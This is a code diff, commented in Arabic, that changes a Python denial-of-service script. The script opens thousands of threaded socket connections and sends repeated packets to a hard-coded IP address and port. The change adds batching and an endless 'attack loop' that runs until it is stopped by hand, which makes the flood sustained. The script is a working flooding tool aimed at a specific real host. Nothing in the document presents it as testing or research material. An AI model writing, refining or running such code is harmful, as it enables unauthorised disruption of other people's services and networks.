@@ -1,10 +1,12 @@
 import socket
 import threading
+import time
 
-# إعدادات الاتصال (تم تحديد IP والمنفذ مسبقًا)
+# إعدادات الاتصال
 ip = "57.129.39.129"  # عنوان IP الهدف
 port = 10008  # المنفذ الهدف
-num_connections = 9999  # عدد الاتصالات
+num_connections = 9999  # إجمالي عدد الاتصالات
+batch_size = 100  # عدد الاتصالات لكل دفعة
 num_send_per_connection = 1000  # عدد الحزم المرسلة لكل اتصال
 
 # الحزمة التي سيتم إرسالها
@@ -22,15 +24,22 @@ def send_packets(ip, port, packet, num_send_per_connection):
     except Exception as e:
         print(f"[-] Error: {e}")
 
-# تنفيذ الاتصالات باستخدام Threads
-threads = []
-for _ in range(num_connections):
-    thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
-    threads.append(thread)
-    thread.start()
+# حلقة الهجوم الرئيسية
+try:
+    while True:  # تشغيل مستمر حتى يتم الإيقاف يدويًا
+        for i in range(0, num_connections, batch_size):
+            threads = []
+            for _ in range(batch_size):
+                thread = threading.Thread(target=send_packets, args=(ip, port, packet, num_send_per_connection))
+                threads.append(thread)
+                thread.start()
 
-# الانتظار حتى تنتهي جميع الـ Threads
-for thread in threads:
-    thread.join()
+            # الانتظار حتى تنتهي جميع الـ Threads
+            for thread in threads:
+                thread.join()
 
-print("Done sending packets.")
+            print(f"[+] Batch of {batch_size} connections completed. Sleeping for 1 second.")
+            time.sleep(1)  # تأخير بسيط لتجنب استنزاف الموارد
+
+except KeyboardInterrupt:
+    print("\n[!] Program stopped by user. Exiting...")
